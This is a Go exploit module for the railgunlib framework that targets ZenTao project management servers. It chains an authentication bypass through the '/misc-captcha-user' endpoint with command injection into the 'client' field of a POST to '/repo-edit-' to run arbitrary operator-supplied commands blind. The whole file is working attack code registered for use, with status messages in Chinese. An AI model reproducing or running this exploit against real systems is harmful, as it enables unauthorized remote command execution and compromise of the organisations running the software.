package exp_zentaopms

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strconv"
	"strings"
)

type Exp_bypass_rce struct {
	exp_templates.ExpTemplate
}

func (self *Exp_bypass_rce) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	httpresp := self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	cookie := httpresp.Resp.Header.Get("Set-Cookie")
	headers.Set("Cookie", cookie)
	headers.Set("Referer", self.Params.BaseParam.Target+"/index.php?m=user&f=login")
	httpresp = self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/misc-captcha-user"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 && httpresp.Resp.Header.Get("Content-Type") == "image/jpeg" {
		self.EchoInfoMsg("权限绕过成功！")
	} else {
		self.EchoErrMsg("漏洞不存在或权限绕过失败")
		return
	}

	randInt := goutils.RandInt(10000, 99999)
	payload := "SCM=Subversion&client={cmd}%26&path=1"
	payload = strings.Replace(payload, "{cmd}", url.QueryEscape(cmd), 1)
	httpresp = self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/repo-edit-"+strconv.Itoa(randInt)), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Status = true
	self.EchoInfoMsg("命令执行完成，无回显。")
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_bypass_rce{}, "exp_bypass_rce.yml")

}
